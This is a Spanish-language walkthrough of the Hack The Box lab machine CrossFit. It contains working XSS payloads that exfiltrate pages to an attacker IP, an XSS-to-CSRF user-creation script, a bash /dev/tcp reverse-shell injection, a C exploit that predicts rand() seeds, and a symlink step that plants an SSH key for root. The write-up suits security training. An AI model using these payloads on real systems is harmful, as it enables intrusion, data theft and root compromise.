-----
- Tags: #ftp #lftp #xss #xss-reflected #access-control-allow-origin #CSRF #web-shell #password-crack #cron-job #ghidra #reversing #escapeArgs #srand-abuse #symbolic-link #authorized_keys
---------
## Técnicas utilizadas
- FTP SSL Certificate Enumeration  
- XSS Injection  
- Subdomain Enumeration through the Origin Header [Access-Control-Allow-Origin]  
- Accessing internal websites through XSS - Creating a javascript file  
- Registering a new user through XSS - CSRF Protection Bypass  
- Uploading a webshell with lftp  
- Cracking Hashes  
- Abusing Cron Job  
- php-shellcommand exploitation - escapeArgs option is not working properly  
- Injecting data into the database to achieve remote command execution (RCE) [User Pivoting]  
- Binary Analysis - dbmsg [GHIDRA]  
- Reversing  
- Creating an exploit - Abusing Rand [Time travel]  
- Abusing symbolic links  
- Injecting our own public key as authorized_keys in /root
## Procedimiento

![[Pasted image 20230629232646.png]]

-------
#### Reconocimiento
Un escaneo con **nmap** nos presenta los siguientes puertos abiertos:
```ruby
# nmap -sCV -p22,21,80 10.10.10.208 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 08:50 MST
Nmap scan report for 10.10.10.208
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ssl-cert: Subject: commonName=*.crossfit.htb/organizationName=Cross Fit Ltd./stateOrProvinceName=NY/countryName=US
| Not valid before: 2020-04-30T19:16:46
|_Not valid after:  3991-08-16T19:16:46
|_ssl-date: TLS randomness does not represent time
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b0e75f5f7e5a4fe8e4cff19801cb3f52 (RSA)
|   256 67882d20a5c1a771502bc807a4b260e5 (ECDSA)
|_  256 62cea31593c88cb68e231d6652f44fef (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: Host: Cross; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.14 seconds

```

Si lanzamos un **whatweb** sobre el aplicativo web, podemos ver las siguientes tecnologías por detrás corriendo:
```ruby
# whatweb 10.10.10.208
http://10.10.10.208 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.10.10.208], Title[Apache2 Debian Default Page: It works], UncommonHeaders[access-control-allow-credentials]
```

-----------------------
#### FTP SSL Certificate Enumeration
Vemos que el puerto **21 - FPT** tiene **TLS** en sus cabeceras. podemos enumera el certificado asi como enumeramos el certificado del puerto **443** solo que añadiendo unos parametros extras al comando:
```
openssl s_client -connect ip:puerto -starttls ftp
```

Podemos ver el siguiente dominio en la respuesta:

![[Pasted image 20230701085315.png]]

Podemos contemplar el subdominio en el */etc/hosts* para enumerar por subdominios o para ver otra respuesta en la pagina en caso de que se este aplicando Virtual Hosting.
Si visitamos la pagina web, vemos que de primera no vemos absolutamente nada, sin embargo, si accedemos al subdominio en contrado podemos observar una pagina web de un gimnasio:
![[Pasted image 20230701085418.png]]

-------
#### XSS Injection

Al final de la pagina, vemos un formulario de contacto, podemos crear una petición con codigo **javascript** para indicar que se descargue un recurso desde nuestra maquina:
```html
<script src="http://10.10.14.30"></script>
```

Y vemos que no recibimos ninguna petición **GET**. En el apartado de **BLOG** vemos que hay otro formulario para dejar un comentaria, podemos intentar lo mismo que intentamos anter para ver si recibimos una petición a nuestro equipo. Al hacer esto y mandarlo, vemos que se nos genera un mensaje de alerta el cual nos dice que van a generar un reporte con la información de nuestro navegador e **IP**:
![[Pasted image 20230701085635.png]]

Abrirmos el **BurSuite** para pasar la petición al **repeter** y hacer algunas pruebas en las cabeceras dado que se nos informa que se genera un reporte con nuestros datos de navegador e ip.
Întentamos primero colocando la inyeción en el **User-Agent**:
![[Pasted image 20230701090851.png]]

Y esta vez si nos llega una peticón **GET** a nuestro servidor:
![[Pasted image 20230701090917.png]]

-----------
#### Subdomain Enumeration through the Origin Header [Access-Control-Allow-Origin]  
Vemos que en la respuesta del servidor hay una cabecera de nombre **Access-Control-Allow-Origin** que cuando nuestro **Origin** no es valido simplemente desaparece. Podemos aprovecharnos de esto para enumerar más subdominios pero ahora con **ffuf** por que este nos permite filtrar por este tipo de cabeceras:
```
# ffuf -u http://10.10.10.10 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -ignore-body -mr "Access-Control-Allow-Origin" -H 'Origin: http://FUZZ.crossfit.htb'
```

Y encontramos un subdominio nuevo el cual podemos contempltar en el */etc/hosts* pera enumerarlo también:
![[Pasted image 20230701092049.png]]

-----------
#### Accessing internal websites through XSS - Creating a javascript file  
Si intentamos acceder al subdomino realmente no logramos a preciar nada, pero puede ser porque para visitar esta pagina web se tenga que hacer desde el mismo segmento de red, asi que podemos proceder a enumerar la pagina y algunas cosas más a través del XSS.

**Enumerar nombre de subdominio de la victima:**
```javascript
var req1 = new XMLHttpRequest();
										// Representa la data en base64
req1.open("GET", 'http://<NuEsTrA-iP>/' + btoa(document.domain), false);
req1.send(null);
```

**Enumerar el subdominio descubierto:**
```javascript
var req1 = new XMLHttpRequest();
req1.open("GET", 'http://ftp.crossfit.htb/', false);
req1.send(null);

var response = req1.responseText;

var req2 = new XMLHttpRequest();
req2.open('GET', 'http://<nUeStRa-Ip>/?page=' + btoa(response), false);
req2.send(null);
```

--------
#### Registering a new user through XSS - CSRF Protection Bypass
Vemos que en el subdominio, hay un dashboard y en este hay una sección para registrar un **nuevo usuario**:
![[Pasted image 20230701092109.png]]

Si hacemos hovering en el boton, vemos la ruta a la cual nos lleva si le damos click, podemos intentar también enumerar esa pagina como lo habiamos hecho anteriormente:
```javascript
var req1 = XMLHttpRequest();
req1.open("GET", "http://ftp.crossfit.htb/accounts/create");
req1.send(null);

var response = req1.responseText;
var req2 = new XMLHttpRequest();
req2.open("GET", "http://<nUeStrA<iP>/?page=" + btoa(response), false);
req2.send(null);
```

Ahora vemos la pagina de registro de usuario, podemos ver los valores que se tramitan por **POST** a la hora de registrar un usuario, asi que podemos aprovechar el **XSS** para tornarlo a un **CSRF** y registrar un usuario nuevo. Tenemos que tener en cuenta que hay un **__token** oculto en la petición que vamos a tener que tramitar tambien para poder registrar un nuevo usuario:
```javascript
var req1 = XMLHttpRequest();
req1.open("GET", "http://ftp.crossfit.htb/accounts/create");
// Indicamos que haremos uso de credenciales
req1.withCredentials = true;
req1.send(null);

// Almacenamos la respuesta en una variable en formato de texto
var response = req1.responseText;
// Filtramos por el token
var parser = new DOMParser();
var doc = parser.parseFormString(response, 'text/html');
var token = doc.getElementsByName("_token")[0].value;

var req2 = new XMLHttpRequest();
// Declaramos la data que vamos a tramitar por POST
var data = "username=sexcott&pass=sexcott123&_token=" + token; 
// Hacemos la petición para crear un nuevo usuario
req2.open('POST', 'http://ftp.crossfit.htb/accounts', false);
// Indicamos que haremos uso de credenciales
req2.withCredentials = true;
// Indicamos el content-type indicado para el formulario
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
// Mandamos la petición con la data antes definida.
req2.send(data);

var response2 = req2.responseText;
var req3 = new XMLHttpRequest();
req3.open("GET", "http://<nUeStRa-iP>/?page" + btoa(response2), false);
req3.send()
```

Revisando el codigo fuente recibido, podemos observar que nuestro usuario ya esta creado:
![[Pasted image 20230701093751.png]]

-------
#### Uploading a webshell with lftp  
Podemos iniciar sesión en el servicio **FTP** con la herramienta **lftp**, ya que necesitamos que la conexión este encryptada.
En primera nos aparecera un error que nos indica que no se puede verificar el certificado. Podemos eludir esto con el siguiente comando:
```
lfpt > set ssl:verify-certificate false
```

Con esto hecho, ya deberiamos poder listar el contenido del servidor **FTP**. Dentro del servidor **FTP** encontramos otro posible subdominio:
![[Pasted image 20230701100549.png]]

Dentro de este directorio tenemos permisos de escritura, asi que podemos proceder a subir una **WebShell** e intentar acceder a ella. Vemos que el archivo no existe y problamente sea porque nosotros no tenemos alcance tampoco a este nuevo subdominio, podemos volver aprovecharnos del **XSS** para que la victima vaya a la **WebShell** y se interprete:
```javascript
var req1 = new XMLHttpRequest();
req1.open("GET", "http://development-test.crossfit.htb/reverse.php", false);
req1.sed(null);
```

-----------
#### Cracking Hashes  
Si inspeccionamos el */etc/passwd* podemos ver que esta el usuario **ftpadm**, cuando este usuario existe, es probable que en */etc/* haya archivos de configuración que usualmente contienen credenciales.
Enumerando las carpetas webs, podemos encontrar una contraseña a la base de datos:
![[Pasted image 20230701101240.png]]

En la base de datos no encontramos nada util realmente asi que vamos a proceder a enumerar los archivos de configuracion de **ftpadm** pero tampoco tenemos privilegios para listar estos archivos.
Si filtramos por archivos que contengan como nombre algunos de los usuarios del sistema, podemos dar con un usuario y una contraseña hasheada. Podemos intentar creackearla con **John** o con **HashCat**.

-----------
#### Abusing Cron Job
Si revisamos las tareas cron definidas en el **crontab**, vemos que el usuario **isaac** esta ejecutando una tarea cron la cual podemos leer ya que pertecenemos al grupo **admins**. El codigo del script es el siguiente:
```php
<?php
/***************************************************
 * Send email updates to users in the mailing list *
 ***************************************************/
require("vendor/autoload.php");
require("includes/functions.php");
require("includes/db.php");
require("includes/config.php");
use mikehaertl\shellcommand\Command;

if($conn)
{
    $fs_iterator = new FilesystemIterator($msg_dir);

    foreach ($fs_iterator as $file_info)
    {
        if($file_info->isFile())
        {
            $full_path = $file_info->getPathname(); 
            $res = $conn->query('SELECT email FROM users');
            while($row = $res->fetch_array(MYSQLI_ASSOC))
            {
                $command = new Command('/usr/bin/mail');
                $command->addArg('-s', 'CrossFit Club Newsletter', $escape=true);
                $command->addArg($row['email'], $escape=true);

                $msg = file_get_contents($full_path);
                $command->setStdIn('test');
                $command->execute();
            }
        }
        unlink($full_path);
    }
}

cleanup();
?>
```

##### php-shellcommand exploitation - escapeArgs option is not working properly  
Podemos ver que verifica si un archivo es como tal un archivo,  despues lee de la base de datos el campo **email** y por ultimo hace unas llamadas al sistema donde se le concatena **email**. Podemos aprovechar que podemos contralar el input del campo **email** para intentar colar un comando, pero tenemos que tener algunas cosas en cosideración dado que tiene un **$escape=true** y puedo que no podemos hacerlo como lo tenemos pensado.
Si revisamos el codigo que importa desde github, podemos ver en las **Issues** que hay una relacionada con el argumento **$escape**:
![[Pasted image 20230701102455.png]]

Basicamente nos dice que la funcion del escape no funciona como deberia y que por lo tanto tenemos la posibilidad de ejecutar comandos. La estructura del comando quedaria más o menos asi
```
# /usr/bin/mail -s "blablabla" ; bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1';
```

##### Injecting data into the database to achieve remote command execution (RCE) [User Pivoting]  
Si esperamos la **reverse shell** vemos que no nos llega. Bien, podemos volver al script y vemos que realmente la condicion quizás no se esta cumpliendo y por lo tanto el bloque de codigo donde se ejecuta la llamada al sistema no se esta aconteciendo.  Podemos intentar listar el contenido en el */etc/* que pertenece al usuario **ftpadm** denuevo, ya que ahora con el usuario que disponemos quizás podemos listar los archivos. Vemos las siguientes credenciales:
![[Pasted image 20230701103323.png]]

Ahora con esta contraseña nos podemos conectar por FTP denuevo e intentar antendar ahora si contra el **path** que contempla los archivos para entrar al bloque de codigo que deseamos:
![[Pasted image 20230701103344.png]]

Con la capacidad de escritura en esta carpeta, subimos un archivo para acontecer el **RCE** y que nos llegue la **Reverse Shell**.

---------
#### Binary Analysis - dbmsg [GHIDRA]  
En este punto podemos intentar subir **Pspy** para analizar los comandos que se esten ejecutando en intervalos regulares de tiempo pero tenemos que considerar agregar la flag **-f** dado que hay configuraciones en el **mount** que nos impide ver procesos externos a los nuestros y vemos uno muy interesante:
![[Pasted image 20230701105830.png]]

Vemos que hay un binario en */usr/bin/dbmsg* que se esta ejecutando. Lo trasladamos a nuestra maquina para analizarlo con **Ghidra** o con **Radare2**. En nuestro caso usaremos **Ghidra**.

------
#### Reversing  
El **main()** del binario es el siguiente:
```c++
void main(void)

{
  __uid_t getUser;
  time_t curr_time;
  
  getUser = geteuid();
  if (getUser != 0) {
    fwrite("This program must be run as root.\n",1,0x22,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  curr_time = time((time_t *)0x0);
  srand((uint)curr_time);
  process_data();
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Asi mismo, el main hace una llamada a **process_data()** el cual contiene lo siguiente:
```c++
void process_data(void)

{
  int iVar1;
  uint uVar2;
  long lVar3;
  undefined8 uVar4;
  size_t sVar5;
  undefined local_f8 [48];
  char local_c8 [48];
  char local_98 [48];
  undefined local_68 [28];
  undefined4 local_4c;
  long local_48;
  FILE *local_40;
  long *row;
  long path;
  long mysql_result;
  long mysql_err_handler;
  
  mysql_err_handler = mysql_init(0);
  if (mysql_err_handler == 0) {
    fwrite("mysql_init() failed\n",1,0x14,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  lVar3 = mysql_real_connect(mysql_err_handler,"localhost","crossfit","oeLoo~y2baeni","crossfit",0,0
                             ,0);
  if (lVar3 == 0) {
    exit_with_error(mysql_err_handler);
  }
  iVar1 = mysql_query(mysql_err_handler,"SELECT * FROM messages");
  if (iVar1 != 0) {
    exit_with_error(mysql_err_handler);
  }
  mysql_result = mysql_store_result(mysql_err_handler);
  if (mysql_result == 0) {
    exit_with_error(mysql_err_handler);
  }
  path = zip_open("/var/backups/mariadb/comments.zip",1,&local_4c);
  if (path != 0) {
    while (row = (long *)mysql_fetch_row(mysql_result), row != (long *)0x0) {
      if ((((*row != 0) && (row[1] != 0)) && (row[2] != 0)) && (row[3] != 0)) {
        lVar3 = *row;
        uVar2 = rand();
        snprintf(local_c8,0x30,"%d%s",(ulong)uVar2,lVar3);
        sVar5 = strlen(local_c8);
        md5sum(local_c8,sVar5 & 0xffffffff,local_f8);
        snprintf(local_98,0x30,"%s%s","/var/local/",local_f8);
        local_40 = fopen(local_98,"w");
        if (local_40 != (FILE *)0x0) {
          fputs((char *)row[1],local_40);
          fputc(0x20,local_40);
          fputs((char *)row[3],local_40);
          fputc(0x20,local_40);
          fputs((char *)row[2],local_40);
          fclose(local_40);
          if (path != 0) {
            printf("Adding file %s\n",local_98);
            local_48 = zip_source_file(path,local_98,0);
            if (local_48 == 0) {
              uVar4 = zip_strerror(path);
              fprintf(stderr,"%s\n",uVar4);
            }
            else {
              lVar3 = zip_file_add(path,local_f8,local_48);
              if (lVar3 < 0) {
                zip_source_free(local_48);
                uVar4 = zip_strerror(path);
                fprintf(stderr,"%s\n",uVar4);
              }
              else {
                uVar4 = zip_strerror(path);
                fprintf(stderr,"%s\n",uVar4);
              }
            }
          }
        }
      }
    }
    mysql_free_result(mysql_result);
    delete_rows(mysql_err_handler);
    mysql_close(mysql_err_handler);
    if (path != 0) {
      zip_close(path);
    }
    delete_files();
    return;
  }
  zip_error_init_with_code(local_68,local_4c);
  uVar4 = zip_error_strerror(local_68);
  fprintf(stderr,"%s\n",uVar4);
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

En resumen, la funcion toma como valor el ID y un numero random ( Tomando como semilla el tiempo actual ), crea un archivo ( Aplicando un md5sum al nombre integro ) lo abre y mete los valores que hay en la tabla **Messages** en base de datos **Crossfit**. Podemos aprovechanos de que sabemos que el nombre del archivo se creara tomando los pasos mencionados anteriormente para insertar nuestra **id_rsa.pub** en el **authorized_keys** del usuario root aprovechadonos de un link simbolico. Esto lo podemos efecutar dado que como **isaac** tenemos permisos de escritura en */var/local*. Dado que el orden insertar los datos en el archivo son de 1, 3 2, primero tenemos que meter la primera cabecera de la **id_rsa.pub**, luego **el final**, y posteriormente todo el texto que hay en medio.

-------
#### Creating an exploit - Abusing Rand [Time travel]  
Podemos crear un script para aprovecharnos del **rand** viajando un minuto en el tiempo para adivinar como sera el siguiente nombre del archivo, el script seria algo como esto:
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(void){
	# Toma el tiempo actual
	time_t curr_time = time(NULL);
	# Elimina los minutos y agrega 61 segundos para adelantarnos un minuto al futuro
	int seed = curr_time - (curr_time % 60) + 61;
	# Genera un numero aleatorio tomando como semilla nuestra variable que viaja un minuto al futuro
	srand(seed);
	# printea el numero random
	printf("%d", rand());
	return 0;
}
```

Esto nos da el valor que tendra el tiempo en el archivo que se creara, solo queda obtener el valor del ID, juntarlo y convertirlo a **md5**. z

Para obtener el valor completo que tendria el archivo podemos crear el siguiente **onliner**:
```
# echo -n "$(./scriptTime)<id>" | md5sum; echo
```

Con el valor, podemos proceder a crear el enlace simbolico:
```
ln -s -f /root/.ssh/authorized_keys <file-value>
```








